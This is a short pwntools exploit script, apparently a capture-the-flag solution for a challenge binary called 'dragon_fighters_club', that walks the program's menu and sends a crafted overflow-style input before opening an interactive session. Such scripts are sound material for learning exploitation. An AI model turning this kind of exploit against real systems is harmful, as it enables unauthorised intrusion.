from pwn import *

elf = context.binary = ELF('./dragon_fighters_club')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("n/A", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()

conn.recvuntil(b">")
conn.sendline(b"3")
conn.recvuntil(b">")
conn.sendline(b"0")
conn.recvuntil(b"deal?")
conn.sendline(b"9"*24 + b'A'*8)

conn.interactive()